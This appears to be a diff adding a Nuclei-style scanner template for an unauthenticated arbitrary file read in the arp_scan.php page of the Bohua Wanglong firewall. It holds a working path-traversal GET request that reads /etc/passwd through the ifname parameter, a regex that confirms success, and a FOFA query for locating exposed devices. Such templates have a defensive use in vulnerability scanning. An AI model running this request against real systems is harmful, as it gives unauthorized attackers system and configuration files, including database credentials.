@@ -1,0 +1,31 @@
+id: bohuawanglong-arp_scan-fileread
+info:
+  name: 中科博华网龙网关 arp_scan.php 任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 博华网龙防火墙是一个集成化网络安全防护系统，旨在实时拦截恶意攻击并过滤风险流量，保障企业网络和数据安全。博华网龙防火墙 arp_scan.php 任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等。
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483734&idx=1&sn=64a8e2e5805441c7f75c58721ac3d3ee&chksm=9606e7c4a1716ed2295eb0eb402430b159a89140b89db60a723818f018fec03835af5215673b&cur_album_id=4045056277938913283&scene=189#wechat_redirect
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: title="博华网龙"
+    tips:
+    repair:
+    version:
+  tags: bohuawanglong,fileread
+
+http:
+  - raw:
+      - |
+        GET /firewall/arp_scan.php?ifname=/../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+              
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
